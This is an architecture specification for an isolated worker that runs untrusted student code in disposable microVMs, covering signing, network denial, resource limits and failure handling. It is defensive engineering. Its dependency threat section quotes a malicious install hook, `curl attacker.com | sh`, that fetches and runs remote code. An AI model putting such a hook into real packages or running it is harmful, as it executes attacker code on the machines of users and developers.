# NOVA AI Internship Mentor — Dedicated Sandbox Worker Specification

**Subsystem:** Out-of-Process Secure Runtime Verification Engine  
**Document Version:** 1.0  
**Status:** Approved Architectural Specification  
**Decision Gate:** **`SANDBOX_WORKER_SPEC_READY`**  

---

## 1. System Architecture & Control-Plane / Execution-Plane Boundary

NOVA enforces a strict physical and logical boundary between the **Trusted Control Plane** (Next.js Application, Supabase Database, AI Reviewer) and the **Untrusted Execution Plane** (Sandbox Worker Service, Disposable MicroVMs).

```text
               ┌─────────────────────────────────────────────────────────┐
               │             TRUSTED ZONE: NOVA CONTROL PLANE            │
               │                                                         │
               │  - Next.js Web App / Server Actions                     │
               │  - Supabase PostgreSQL (RLS Protected)                  │
               │  - Production Secrets (Anthropic Keys, Supabase Key)    │
               │  - Static AST Evidence Collector                        │
               │  - AI Review Agent & Deterministic Validator            │
               └────────────────────────────┬────────────────────────────┘
                                            │
                                            │ Authenticated HTTP POST
                                            │ Header: X-Nova-Signature (HMAC-SHA256)
                                            │ Header: X-Nova-Timestamp (UTC ISO)
                                            │ Payload: Pinned Commit SHA + Profile
                                            │ (ZERO Application Secrets Transmitted)
                                            ▼
               ═══════════════════════════════════════════════════════════
                         STRICT NETWORK & PROCESS ISOLATION BOUNDARY
               ═══════════════════════════════════════════════════════════
                                            │
                                            ▼
               ┌─────────────────────────────────────────────────────────┐
               │             UNTRUSTED ZONE: SANDBOX WORKER              │
               │                                                         │
               │  1. Request Authentication & Timestamp Validation       │
               │  2. Policy Validation & Profile Classification          │
               │  3. Repository Tarball Ingestion @ Immutable Commit SHA │
               │  4. SHA Verification (git rev-parse HEAD == commit_sha) │
               │  5. Ephemeral Disposable MicroVM Launch (Firecracker)   │
               │     ├── Single-use lifecycle (CREATE -> EXEC -> DESTROY)│
               │     ├── NETWORK = DENY (Zero egress, unattached vNIC)   │
               │     ├── Resource Limits: 512MB RAM, 1 vCPU, 60s, 16 PIDs│
               │     ├── Minimal Environment (PATH, NODE_ENV=test)       │
               │     └── Allowlisted Test Command (npm test / pytest)    │
               │  6. Structured Log Collection & 64KB Buffer Bounding    │
               │  7. MicroVM Destruction & Workspace Wipeout             │
               └────────────────────────────┬────────────────────────────┘
                                            │
                                            │ Signed JSON Response
                                            │ { exit_code, tests_summary, logs }
                                            │ (NO Scores, NO AI Verdicts)
                                            ▼
               ┌─────────────────────────────────────────────────────────┐
               │        TRUSTED ZONE: AI REVIEW AGENT & VALIDATOR        │
               │                                                         │
               │  - Ingests Factual Runtime Evidence + Static Evidence   │
               │  - Anti-Hallucination Claim Validation                  │
               │  - Updates Multi-Attempt Persistence (Attempt N -> SHA) │
               └─────────────────────────────────────────────────────────┘
```

---

## 2. Infrastructure Comparison & Technology Selection

| Execution Infrastructure | Kernel & OS Boundary | Network Isolation | Resource Controls (cgroups v2) | Startup Latency | Operational Overhead | Local Dev Viability | Production Suitability | Evaluation Verdict |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| **A. Host Subprocess (`spawn`)** | **None.** Shared process space and host kernel. | **None.** Inherits host network and sockets. | Weak (signals only). | < 5 ms | Zero | Dangerous | **REJECTED (Catastrophic Risk)** |
| **B. Docker on Web Host (`/var/run/docker.sock`)** | Shared Linux kernel; vulnerable to kernel privilege escalation. | Requires custom `iptables` bridging. | Good via Docker flags (`--memory`, `--cpus`). | 500 – 1500 ms | High (Requires root Docker daemon on web server). | Good | **REJECTED (Docker socket privilege escalation risk)** |
| **C. gVisor (`runsc` Container Runtime)** | **High.** Intercepts syscalls via user-space Sentry emulator. | Virtualized network stack; zero host routing. | Strong cgroups v2 integration. | 100 – 300 ms | Moderate (Requires custom container runtime on worker node). | Moderate (Linux only) | **VIABLE for self-hosted Linux worker pools.** |
| **D. Firecracker MicroVMs (Hardware KVM)** | **Maximum (Gold Standard).** Separate guest Linux kernel per MicroVM; hardware KVM isolation. | **Maximum.** No guest vNIC attached (`veth=none`); zero routing. | Hardware guest memory, vCPU, and process boundaries. | 5 – 20 ms | High (Requires bare-metal or nested KVM cloud VMs). | Requires Linux/KVM | **RECOMMENDED SELF-HOSTED BARE-METAL RUNNER** |
| **E. Managed Ephemeral Sandbox (e.g. E2B / Modal / Fly Machines)** | **Maximum.** Hardware-isolated microVMs managed via secure REST/gRPC API. | **Maximum.** Configurable `network: false` egress policies. | Built-in per-sandbox memory, CPU, timeout, and process caps. | 50 – 200 ms | Lowest (Out-of-band execution without managing KVM hypervisors). | Excellent (Pluggable interface) | **RECOMMENDED MANAGED PRODUCTION RUNNER** |
| **F. Serverless Containers (Cloud Run / AWS Lambda)** | **High.** MicroVM isolation (AWS Firecracker / GCP gVisor). | VPC egress security groups; `NETWORK=DENY`. | Cloud hypervisor limits. | 200 – 800 ms | Low (Serverless pay-per-job). | Moderate | **VIABLE ALTERNATIVE for Cloud-Native stacks** |

---

## 3. Recommended Architecture Selection

### Chosen Architecture: Dual-Tier Worker Deployment
1. **Production Primary:** **Managed Ephemeral MicroVM Service (E2B / Modal) or Dedicated Firecracker KVM Worker Pool**.
   - *Rationale:* Hardware-assisted virtualization (KVM) ensures untrusted student code executes inside an ephemeral guest kernel that is completely separated from the worker host and NOVA application servers.
2. **Local Development & CI:** **Deterministic In-Memory Mock Adapter (`DeterministicMockRunner`)**.
   - *Rationale:* Developers and CI pipelines do not run arbitrary student code on their local developer machines, maintaining sub-millisecond test speeds and zero host compromise risk.

### Required Infrastructure:
- Dedicated worker node with Linux KVM enabled (e.g. AWS `c6i.metal` / `c6i.xlarge` with nested virtualization, or GCP `n2-standard-4` with nested virtualization), OR managed microVM API keys.
- FastAPI / Go HTTP daemon serving `/v1/execute` behind an internal private VPC endpoint.

---

## 4. Job Authentication & Request Authenticity

### Security Invariants:
1. The Sandbox Worker is **NEVER** publicly accessible to students or the public internet.
2. All incoming requests from NOVA must be cryptographically signed using HMAC-SHA256.
3. The request payload contains **ZERO** application credentials, database keys, or AI tokens.

### Request Headers:
```http
POST /v1/execute HTTP/1.1
Host: sandbox-worker.internal.nova.platform:8080
Content-Type: application/json
X-Nova-Timestamp: 2026-08-31T12:00:00.000Z
X-Nova-Signature: sha256=a3b4c5d6e7f8... [HMAC-SHA256(timestamp + "." + body, NOVA_WORKER_SECRET)]
```

### Signature Verification Algorithm:
```text
1. Read X-Nova-Timestamp header.
2. Verify |current_time - X-Nova-Timestamp| <= 300 seconds (Replay attack prevention).
3. Compute expected_signature = HMAC_SHA256(X-Nova-Timestamp + "." + raw_request_body, SHARED_SECRET).
4. Perform constant-time comparison: timingSafeEqual(expected_signature, X-Nova-Signature).
5. If invalid -> Return HTTP 401 Unauthorized immediately.
```

### Request Payload Specification:
```json
{
  "execution_id": "job_1725105600000_abc12",
  "submission_id": "sub_1725105600000_xyz89",
  "commit_sha": "a1b2c3d4e5f67890abcdef1234567890abcdef12",
  "repository_url": "https://github.com/student/assignment-repo",
  "execution_profile": "node_typescript",
  "profile_version": "1.0",
  "limits": {
    "timeout_seconds": 60,
    "max_memory_mb": 512,
    "max_cpus": 1,
    "max_processes": 16,
    "max_output_bytes": 65536,
    "network": "DENY"
  }
}
```

---

## 5. Repository Preparation & Commit Integrity

The worker must guarantee that the code being executed strictly matches the immutable commit SHA pinned by NOVA:

```text
1. Fetch Repository Archive:
   - Worker fetches git archive tarball for exact commit_sha:
     GET https://api.github.com/repos/{owner}/{repo}/tarball/{commit_sha}
   - Or performs shallow clone:
     git clone --depth 1 --branch main {repository_url} /workspace/repo

2. Checkout & Verification:
   - Execute: git checkout {commit_sha}
   - Verify SHA: actual_sha=$(git rev-parse HEAD)
   - Assert: actual_sha == request.commit_sha

3. Mismatch Handling:
   - If actual_sha != request.commit_sha:
     Terminate execution immediately;
     Return status: "blocked", stderr: "Commit SHA mismatch detected".
```

---

## 6. Ephemeral Execution Lifecycle

Every execution follows a strict, non-reusable single-use lifecycle:

```text
┌──────────────┐
│    CREATE    │  Provision fresh ephemeral MicroVM with minimal read-only guest rootfs
└──────┬───────┘
       │
┌──────▼───────┐
│   PREPARE    │  Mount ephemeral tmpfs /workspace (256MB cap); unpack repository at pinned SHA
└──────┬───────┘
       │
┌──────▼───────┐
│    VERIFY    │  Verify git commit SHA; sanitize guest environment (strip all host envs)
└──────┬───────┘
       │
┌──────▼───────┐
│   EXECUTE    │  Execute allowlisted test command (e.g. `npm test -- --runInBand --ci`)
└──────┬───────┘  Enforce: 1 vCPU, 512MB RAM, 16 PIDs, NETWORK=DENY, 60s hard timeout
       │
┌──────▼───────┐
│   COLLECT    │  Read structured test metrics & truncate stdout/stderr to 64KB max buffer
└──────┬───────┘
       │
┌──────▼───────┐
│   DESTROY    │  Forcibly destroy MicroVM; wipe tmpfs workspace; clean memory & cgroups
└──────────────┘
```

---

## 7. Isolation Controls & Limits Enforcement

### 1. Network Policy (`NETWORK = DENY`)
- **Enforcement:** The guest MicroVM is booted with **zero virtual network interfaces** (unattached vNIC).
- **Firewall:** Host iptables default policy: `iptables -A FORWARD -i microvm+ -j DROP`.
- **Egress Tests:** Egress attempts to `127.0.0.1`, `169.254.169.254`, `54321` (Supabase), or external web immediately fail with `EHOSTUNREACH`.

### 2. Resource & Process Limits
- **CPU:** 1.0 vCPU quota via CFS bandwidth capping (`cpu.max = 100000 100000`).
- **Memory:** 512MB RAM maximum (`memory.max = 536870912`, `memory.swap.max = 0`). Exceeding limit triggers kernel OOM killer $\to$ returns `resource_exceeded` (exit 137).
- **Process Ceiling:** `pids.max = 16`. Fork bombs fail with `EAGAIN` without affecting host OS.
- **Wall-Clock Timeout:** 60 seconds hard timer. If exceeded $\to$ hypervisor sends `SIGKILL` $\to$ returns `timed_out` (exit 124).
- **Log Buffer Bounding:** Stdout and stderr pipe streams are truncated at 65,536 bytes (64KB). Excess output is discarded.

### 3. Secret Isolation
- The guest environment receives **only**:
  ```bash
  PATH=/usr/local/bin:/usr/bin:/bin
  NODE_ENV=test
  HOME=/workspace
  TMPDIR=/workspace/tmp
  ```
- Application secrets (`SUPABASE_SECRET_KEY`, `ANTHROPIC_API_KEY`, DB credentials) are **never** present in guest memory or files.

---

## 8. Node.js & Python Security & Dependency Strategy

### Dependency Security Threat:
Untrusted repositories often define malicious package lifecycle hooks (`postinstall: "curl attacker.com | sh"`) or malicious `setup.py` build hooks.

### Enforcement Strategy:
1. **Pre-Baked Trusted Runtime Images:**
   - The worker utilizes immutable container/rootfs images pre-populated with standard testing libraries:
     - Node: `jest`, `ts-node`, `typescript`, `vitest`, `@types/node`, `@types/jest`.
     - Python: `pytest`, `pandas`, `numpy`, `scikit-learn`, `flake8`, `ruff`.
2. **Offline Package Execution:**
   - Sandboxes operate under `NETWORK = DENY`. Dynamic external package downloads from public npm/PyPI are physically blocked.
3. **Ignore Lifecycle Scripts:**
   - If local project linking is required, execution runs with `npm ci --ignore-scripts --prefer-offline`.

---

## 9. Runtime Evidence Model & Response Specification

The worker produces **only factual execution outputs**. It **never** computes student scores, AI feedback, or acceptance criteria verdicts.

### Success Response (`status: "completed"`):
```json
{
  "execution_id": "job_1725105600000_abc12",
  "submission_id": "sub_1725105600000_xyz89",
  "commit_sha": "a1b2c3d4e5f67890abcdef1234567890abcdef12",
  "runner_version": "1.0",
  "profile_version": "1.0",
  "status": "completed",
  "exit_code": 0,
  "duration_ms": 1420,
  "tests_summary": {
    "total": 8,
    "passed": 8,
    "failed": 0,
    "skipped": 0
  },
  "build_summary": {
    "attempted": true,
    "status": "passed",
    "details": "TypeScript compilation clean"
  },
  "lint_summary": {
    "attempted": true,
    "status": "passed",
    "warnings": 0,
    "errors": 0
  },
  "bounded_stdout": "PASS tests/app.test.ts\n  ✓ GET /students returns 200 (14ms)\n\nTest Suites: 1 passed, 1 total\nTests: 8 passed, 8 total",
  "bounded_stderr": "",
  "resource_usage": {
    "peak_memory_bytes": 84934656,
    "cpu_time_ms": 920
  },
  "collected_at": "2026-08-31T12:00:02.420Z"
}
```

### Timeout Response (`status: "timed_out"`):
```json
{
  "execution_id": "job_1725105600000_abc12",
  "submission_id": "sub_1725105600000_xyz89",
  "commit_sha": "a1b2c3d4e5f67890abcdef1234567890abcdef12",
  "runner_version": "1.0",
  "profile_version": "1.0",
  "status": "timed_out",
  "exit_code": 124,
  "duration_ms": 60000,
  "tests_summary": { "total": 0, "passed": 0, "failed": 0, "skipped": 0 },
  "build_summary": { "attempted": true, "status": "failed", "details": "Execution timed out after 60s" },
  "lint_summary": { "attempted": false, "status": "skipped", "warnings": 0, "errors": 0 },
  "bounded_stdout": "Starting test execution...\n[TIMEOUT] 60s limit exceeded. Process group terminated.",
  "bounded_stderr": "SIGKILL dispatched by hypervisor.",
  "resource_usage": { "peak_memory_bytes": 120000000, "cpu_time_ms": 60000 },
  "collected_at": "2026-08-31T12:01:00.000Z"
}
```

---

## 10. Worker Failure Semantics & Infrastructure Safety

If the worker encounters an internal system error, cloud hypervisor startup timeout, or GitHub API fetch outage:
- The worker returns `status: "verification_unavailable"` with an HTTP 503 or structured JSON error.
- NOVA's control plane treats this as an **infrastructure failure** $\to$ routes submission to `manual_review` / `verification_unavailable`.
- The student is **NEVER** marked as failed and **NEVER** receives a score of 0 for infrastructure outages.

---

## 11. Cost & Operational Model

| Cost Driver | Self-Hosted Firecracker Cluster | Managed Sandbox Provider (E2B / Modal) | Serverless Container (Cloud Run) |
| :--- | :--- | :--- | :--- |
| **Fixed Cost** | $150 – $300 / month (Dedicated KVM metal instances) | $0 / month (Pay-per-execution) | $0 / month |
| **Per-Execution Cost** | Negligible amortized compute cost | ~$0.0002 – $0.001 per test run | ~$0.0001 per test run |
| **Idle Overhead** | High (Worker instances run 24/7) | Zero (Scale to zero) | Zero (Scale to zero) |
| **Operational Burden** | High (Kernel patches, KVM host maintenance) | Lowest (API managed) | Low (Container images managed) |
| **Recommended Staging** | Long-term high volume (>100k submissions/mo) | **Recommended for Initial Production Launch** | Alternative Cloud Staging |

---

## 12. Step-by-Step Implementation Roadmap

```text
Phase 3A: Sandbox Worker API & Schema Contracts
├── Implement FastAPI / Node worker daemon with /v1/execute endpoint
└── Formalize request/response Zod & Pydantic schemas

Phase 3B: HMAC-SHA256 Service Authentication
├── Implement request signature generator in NOVA control plane (runner.ts)
└── Implement signature validator & replay window check in worker daemon

Phase 3C: Repository Tarball Fetching & Commit SHA Verifier
├── Fetch immutable commit archive via GitHub API
└── Validate git rev-parse HEAD matches request commit_sha

Phase 3D: MicroVM Lifecycle Manager
├── Implement MicroVM builder (Firecracker API or E2B SDK)
└── Enforce single-use CREATE -> EXECUTE -> DESTROY lifecycle

Phase 3E: Allowlisted Execution Engine & Environment Sanitizer
├── Construct sanitized environment (PATH, NODE_ENV=test)
└── Execute allowlisted command under 1 vCPU, 512MB RAM, 16 PIDs, 60s timeout

Phase 3F: Structured Evidence Collector & Stream Bounding
├── Parse structured test outputs (Jest JSON reporter, Pytest JUnit XML)
└── Bounded stream reader truncating logs at 64KB

Phase 3G: NOVA Control Plane Integration
├── Configure NOVA_SANDBOX_WORKER_URL and NOVA_WORKER_SHARED_SECRET
└── Connect IsolatedSandboxRunner to live worker endpoint

Phase 3H: Security Fixture Testing in Isolated Environment
├── Execute synthetic attack suite (fork bomb, OOM, timeout, network egress, symlink)
└── Verify zero host escape and clean resource cleanup

Phase 3I: Production Deployment & Monitoring
├── Deploy worker to cloud VPC with private network peering
└── Setup Prometheus observability for worker latency, errors, and memory metrics
```

---

## 13. Final Decision

```text
======================================================================
              SANDBOX WORKER SPECIFICATION DECISION
======================================================================

DECISION: SANDBOX_WORKER_SPEC_READY

1. Threat Model Documented:    ✅ COMPLETE (docs/AI_INTERNSHIP_MENTOR_SANDBOX_WORKER_THREAT_MODEL.md)
2. Architectural Boundary:     ✅ APPROVED (Out-of-process ephemeral microVMs)
3. Job Authentication:         ✅ APPROVED (HMAC-SHA256 request signing)
4. Commit Pinning Guarantee:   ✅ APPROVED (Immutable commit verification)
5. Zero Secret Exposure:       ✅ APPROVED (Minimal environment)
6. Network Denial Policy:      ✅ APPROVED (NETWORK = DENY)
7. Factual Evidence Invariant: ✅ APPROVED (Runner-only factual metrics)
8. Implementation Roadmap:     ✅ APPROVED (Phases 3A through 3I defined)
======================================================================
```
